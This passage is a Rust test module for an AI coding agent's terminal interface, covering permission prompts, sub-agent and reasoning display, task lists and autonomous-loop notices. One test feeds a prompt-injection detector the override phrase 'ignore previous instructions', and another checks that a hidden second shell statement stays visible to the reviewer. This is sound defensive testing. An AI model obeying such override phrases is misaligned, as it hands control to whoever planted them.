        // to know how to respond. The footer must always render, regardless
        // of how long the diff above it is.
        let long_preview: String = (0..200).map(|i| format!("+line {i}\n")).collect();
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/big_file.rs")),
            arguments_preview: serde_json::json!({}),
            preview: Some(long_preview),
            diff: None,
        };

        let backend = TestBackend::new(120, 40);
        let mut terminal = Terminal::new(backend).unwrap();
        terminal
            .draw(|frame| render_permission_modal(frame, &request))
            .unwrap();

        let rendered = render_to_string(&terminal);
        assert!(
            rendered.contains("Allow"),
            "the Allow/Deny button row must always be visible, even for a long diff:\n{rendered}"
        );
    }

    #[test]
    fn command_target_with_embedded_newline_splits_into_visible_lines() {
        // Regression test for the modal newline-hiding bug: a `run_shell`
        // command whose string contains a real `\n` must render as multiple
        // `Line`s so the second statement can't be hidden from the reviewer
        // by ratatui's silent `\n`-dropping in single-`Line` rendering.
        let target = PermissionTarget::Command {
            program: "sh".to_string(),
            args: vec!["-c".to_string(), "echo first\necho second".to_string()],
        };

        let lines = target_lines(&target);
        assert_eq!(
            lines.len(),
            2,
            "expected the newline to split into two lines"
        );
        assert_eq!(lines[0].to_string(), "Command: sh -c echo first");
        // The second statement must be present as its own visible line.
        assert!(lines[1].to_string().contains("echo second"));
    }

    #[test]
    fn move_target_renders_as_from_arrow_to() {
        let target = PermissionTarget::Move {
            from: PathBuf::from("/project/old.rs"),
            to: PathBuf::from("/project/new.rs"),
        };

        let lines = target_lines(&target);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].to_string(), "Move: /project/old.rs -> /project/new.rs");
    }

    fn task(id: u32, text: &str, status: TaskStatus) -> Task {
        Task {
            id,
            text: text.to_string(),
            status,
        }
    }

    fn tool_call(id: &str, name: &str) -> aivyx_types::ToolCall {
        aivyx_types::ToolCall {
            id: aivyx_types::ToolCallId(id.to_string()),
            name: name.to_string(),
            arguments: serde_json::json!({}),
            source: aivyx_types::ToolCallSource::Native,
        }
    }

    #[test]
    fn sub_agent_text_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::TextDelta("exploring the auth module".to_string()),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text == "exploring the auth module"
        ));
    }

    #[test]
    fn sub_agent_tool_call_is_prefixed_and_still_distinguished() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::ToolCallDetected(tool_call("c1", "read_file")),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text.contains("read_file")
        ));
    }

    #[test]
    fn architect_note_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ArchitectNote(
            "plan from model-architect:\n1. Add TokenV2.".to_string(),
        ));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::Architect(text)) if text.contains("Add TokenV2")
        ));

        let lines = chat_line_to_lines(app.transcript.last().unwrap());
        assert!(lines[0].to_string().starts_with("architect> "));
    }

    #[test]
    fn reasoning_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ReasoningDelta(
            "considering the edge cases".to_string(),
        ));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::Reasoning(text)) if text == "considering the edge cases"
        ));

        let lines = chat_line_to_lines(app.transcript.last().unwrap());
        assert!(lines[0].to_string().contains("thinking:"));
    }

    #[test]
    fn reasoning_then_text_delta_starts_a_fresh_assistant_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::ReasoningDelta("hmm".to_string()));
        app.handle_agent_event(AgentEvent::ReasoningDelta(", let me see".to_string()));
        app.handle_agent_event(AgentEvent::TextDelta("Here's the answer".to_string()));

        assert_eq!(app.transcript.len(), 2);
        assert!(matches!(
            &app.transcript[0],
            ChatLine::Reasoning(text) if text == "hmm, let me see"
        ));
        assert!(matches!(
            &app.transcript[1],
            ChatLine::Assistant(text) if text == "Here's the answer"
        ));
    }

    #[test]
    fn sub_agent_reasoning_delta_renders_as_a_distinguished_chat_line() {
        let mut app = App::new(None, PlanMode::new());
        app.handle_agent_event(AgentEvent::SubAgentActivity(Box::new(
            AgentEvent::ReasoningDelta("weighing two approaches".to_string()),
        )));

        assert!(matches!(
            app.transcript.last(),
            Some(ChatLine::SubAgent(text)) if text == "weighing two approaches"
        ));
    }

    #[test]
    fn seed_transcript_rebuilds_user_assistant_and_tool_lines() {
        use aivyx_types::{ToolCall, ToolCallId, ToolCallSource, ToolResult};

        let history = vec![
            Message::text(Role::User, "read foo"),
            Message {
                role: Role::Assistant,
                content: vec![
                    ContentBlock::Text("looking".to_string()),
                    ContentBlock::ToolCall(ToolCall {
                        id: ToolCallId("c1".to_string()),
                        name: "read_file".to_string(),
                        arguments: serde_json::json!({"path": "foo"}),
                        source: ToolCallSource::Native,
                    }),
                ],
                tool_call_id: None,
            },
            Message {
                role: Role::Tool,
                tool_call_id: Some(ToolCallId("c1".to_string())),
                content: vec![ContentBlock::ToolResult(ToolResult {
                    call_id: ToolCallId("c1".to_string()),
                    output: ToolOutput::Denied("nope".to_string()),
                })],
            },
        ];

        let lines = seed_transcript(&history);

        assert_eq!(lines.len(), 4);
        assert!(matches!(&lines[0], ChatLine::User(t) if t == "read foo"));
        assert!(matches!(&lines[1], ChatLine::Assistant(t) if t == "looking"));
        assert!(matches!(&lines[2], ChatLine::ToolCall(t) if t.starts_with("read_file(")));
        assert!(matches!(&lines[3], ChatLine::ToolResult(t) if t == "denied: nope"));
    }

    #[test]
    fn task_window_shows_everything_when_it_fits() {
        let tasks = vec![
            task(1, "a", TaskStatus::Done),
            task(2, "b", TaskStatus::Pending),
        ];
        assert_eq!(task_window(&tasks, 6).len(), 2);
    }

    #[test]
    fn task_window_skips_a_leading_run_of_done_tasks() {
        let mut tasks: Vec<Task> = (1..=6).map(|i| task(i, "done", TaskStatus::Done)).collect();
        tasks.push(task(7, "current", TaskStatus::InProgress));
        tasks.push(task(8, "next", TaskStatus::Pending));

        let window = task_window(&tasks, 6);

        assert_eq!(window.len(), 6);
        // The window is clamped to stay full, so it starts before the first
        // unfinished task here — but the unfinished tail must be visible.
        assert!(window.iter().any(|t| t.text == "current"));
        assert!(window.iter().any(|t| t.text == "next"));
    }

    #[test]
    fn task_window_of_all_done_tasks_shows_the_head() {
        let tasks: Vec<Task> = (1..=9).map(|i| task(i, "done", TaskStatus::Done)).collect();
        let window = task_window(&tasks, 6);
        assert_eq!(window.len(), 6);
        assert_eq!(window[0].id, 1);
    }

    #[test]
    fn single_line_command_target_stays_one_line() {
        let target = PermissionTarget::Command {
            program: "cargo".to_string(),
            args: vec!["test".to_string()],
        };
        let lines = target_lines(&target);
        assert_eq!(lines.len(), 1);
        assert_eq!(lines[0].to_string(), "Command: cargo test");
    }

    fn done_task(id: u32) -> Task {
        Task {
            id,
            text: "x".to_string(),
            status: TaskStatus::Done,
        }
    }

    fn pending_task(id: u32) -> Task {
        Task {
            id,
            text: "x".to_string(),
            status: TaskStatus::Pending,
        }
    }

    #[test]
    fn goal_achieved_requires_at_least_one_task_and_all_done() {
        assert!(!goal_achieved(&[]), "no tasks ever set means never done");
        assert!(!goal_achieved(&[done_task(1), pending_task(2)]));
        assert!(goal_achieved(&[done_task(1), done_task(2)]));
    }

    #[test]
    fn next_autonomous_message_chooses_correctly() {
        assert_eq!(
            next_autonomous_message(true, &[]),
            Some("continue".to_string()),
            "a paused turn always continues, regardless of task state"
        );
        assert_eq!(
            next_autonomous_message(false, &[done_task(1)]),
            None,
            "goal achieved -> stop"
        );
        assert_eq!(
            next_autonomous_message(false, &[pending_task(1)]),
            Some("continue working toward the goal".to_string())
        );
        assert_eq!(
            next_autonomous_message(false, &[]),
            Some("continue working toward the goal".to_string()),
            "no tasks ever set -> keep going until budget exhausts, not stuck forever"
        );
    }

    // The driver loop that actually calls `agent.notify(...)` lives inside a
    // `tokio::spawn`ed closure in `run()`, driving a real `Agent` through
    // `run_turn` — it isn't a pure function, and constructing a real `Agent`
    // here would require pulling in `aivyx-llm` (for a mock `LlmBackend`)
    // and `aivyx-tools` (for `ToolExecutor`), neither of which is a
    // dependency of this crate today. So instead these tests pin down the
    // three notice-message builders the loop calls at each stop point —
    // together with `goal_achieved`/`next_autonomous_message` above (which
    // already cover *when* each path fires), this is what's practically
    // testable without adding new test-only dependencies for one call site
    // each.

    #[test]
    fn budget_exhausted_notice_reports_iterations_and_task_progress() {
        let tasks = vec![done_task(1), done_task(2), pending_task(3)];
        let message = budget_exhausted_notice(5, &tasks);
        assert!(message.contains("budget exhausted"));
        assert!(message.contains('5'));
        assert!(message.contains("2/3 tasks done"));
    }

    #[test]
    fn budget_exhausted_notice_handles_no_tasks_ever_set() {
        let message = budget_exhausted_notice(3, &[]);
        assert!(message.contains("0/0 tasks done"));
    }

    #[test]
    fn cancelled_notice_reports_iterations() {
        let message = cancelled_notice(2);
        assert!(message.contains("cancelled by user"));
        assert!(message.contains('2'));
    }

    #[test]
    fn goal_achieved_notice_reports_iterations() {
        let message = goal_achieved_notice(4);
        assert!(message.contains("goal achieved"));
        assert!(message.contains('4'));
    }

    #[test]
    fn injection_detected_notice_reports_iterations_source_and_pattern() {
        let finding = InjectionFinding {
            source: "read_file: notes.txt".to_string(),
            matched_pattern: "ignore previous instructions".to_string(),
            excerpt: "...IGNORE PREVIOUS INSTRUCTIONS...".to_string(),
        };
        let message = injection_detected_notice(3, &finding);
        assert!(message.contains("possible prompt injection"));
        assert!(message.contains('3'));
        assert!(message.contains("read_file: notes.txt"));
        assert!(message.contains("ignore previous instructions"));
    }

    fn modal_request() -> (crate::permission::ModalRequest, oneshot::Receiver<UserResponse>) {
        let (reply_tx, reply_rx) = oneshot::channel();
        let request = PermissionRequest {
            tool_name: "write_file".to_string(),
            action: ActionKind::Write,
            target: PermissionTarget::Path(PathBuf::from("/tmp/example.rs")),
            arguments_preview: serde_json::json!({}),
            preview: None,
            diff: None,
        };
        (
            crate::permission::ModalRequest { request, reply_tx },
            reply_rx,
        )
    }

    #[test]
    fn pending_permission_is_stale_false_when_nothing_pending() {
        let app = App::new(None, PlanMode::new());
        assert!(!app.pending_permission_is_stale());
    }

    #[test]
    fn pending_permission_is_stale_false_while_receiver_alive() {
        let mut app = App::new(None, PlanMode::new());
        let (modal, reply_rx) = modal_request();
        app.pending_permission = Some(modal);

        assert!(!app.pending_permission_is_stale());
        drop(reply_rx); // keep the receiver alive through the assertion above
    }

    #[test]
    fn pending_permission_is_stale_true_once_editor_answers_and_drops_receiver() {
        let mut app = App::new(None, PlanMode::new());
        let (modal, reply_rx) = modal_request();
        app.pending_permission = Some(modal);

        // Simulate the editor-approval race winning: the other side of
        // ConfirmationGate's select! already got its answer and dropped its
        // receiver, closing this modal's reply channel.
        drop(reply_rx);

        assert!(app.pending_permission_is_stale());
    }

    #[test]
    fn conversation_cleared_event_resets_transcript_tasks_and_context_usage() {
        let mut app = App::new(None, PlanMode::new());
        app.transcript.push(ChatLine::User("hi".to_string()));
        app.transcript.push(ChatLine::Assistant("hello".to_string()));
        app.tasks.push(Task {
            id: 1,
            text: "a task".to_string(),
            status: TaskStatus::Pending,
        });
        app.context_usage = Some((100, 1000));
        app.streaming_active = true;

        app.handle_agent_event(AgentEvent::ConversationCleared);

        assert!(app.transcript.is_empty());
        assert!(app.tasks.is_empty());
        assert_eq!(app.context_usage, None);
        assert!(!app.streaming_active);
    }

    #[test]
    fn show_help_lists_every_known_command_with_its_description() {
        let mut app = App::new(None, PlanMode::new());
        app.show_help();

        assert_eq!(app.transcript.len(), 1);
        let ChatLine::Notice(text) = &app.transcript[0] else {
            panic!("expected a Notice line");
        };
        for cmd in aivyx_core::commands::COMMANDS {
            assert!(
                text.contains(cmd.name) && text.contains(cmd.description),
                "help text missing {}: {text}",
                cmd.name
            );
        }
    }

    #[test]
    fn command_hint_matches_narrows_as_the_user_types_and_stops_after_a_space() {
        let mut app = App::new(None, PlanMode::new());
        assert!(app.command_hint_matches().is_empty(), "empty input has no hints");

        app.input.insert_str("/");
        assert_eq!(app.command_hint_matches().len(), aivyx_core::commands::COMMANDS.len());

        app.input.insert_str("cl");
        let matches = app.command_hint_matches();
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].name, "/clear");

        app.input.insert_str(" ");
        assert!(
            app.command_hint_matches().is_empty(),
            "a space means the command name is done being composed"
        );
    }

    #[test]
    fn command_hint_matches_is_empty_for_plain_text() {
        let mut app = App::new(None, PlanMode::new());
        app.input.insert_str("fix the bug");
        assert!(app.command_hint_matches().is_empty());
    }

    #[test]
    fn command_hint_rect_sits_directly_above_the_input_area_and_never_goes_negative() {
        let input_area = Rect { x: 0, y: 10, width: 80, height: 3 };
        let rect = command_hint_rect(input_area, 2);
        assert_eq!(rect.height, 4); // 2 matches + 2 borders
        assert_eq!(rect.y, 6); // 10 - 4
        assert_eq!(rect.x, input_area.x);
        assert_eq!(rect.width, input_area.width);

        // Near the top of the frame: must clamp, not underflow/panic.
        let near_top = Rect { x: 0, y: 1, width: 80, height: 3 };
        let clamped = command_hint_rect(near_top, 6);
        assert_eq!(clamped.y, 0);
    }
}
